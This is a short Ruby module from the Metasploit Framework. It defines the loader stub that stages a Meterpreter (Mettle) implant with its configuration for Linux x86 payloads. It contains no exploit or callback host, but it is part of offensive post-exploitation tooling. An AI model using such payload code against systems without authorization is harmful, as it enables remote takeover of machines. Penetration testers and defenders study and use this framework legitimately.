# -*- coding: binary -*-

module Msf

###
#
# Common module stub for ARCH_X86 payloads that make use of Meterpreter.
#
###

module Payload::Linux::X86::MeterpreterLoader

  include Msf::Sessions::MeterpreterOptions::Linux
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration RDI',
      'Description'   => 'Inject Meterpreter & the configuration stub via RDI',
      'Author'        => [ 'sf', 'OJ Reeves' ],
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      ))
  end

  def stage_meterpreter(opts={})
    opts = mettle_logging_config(opts).merge(opts)
    MetasploitPayloads::Mettle.new('i486-linux-musl', generate_config(opts)).to_binary :process_image
  end
end

end
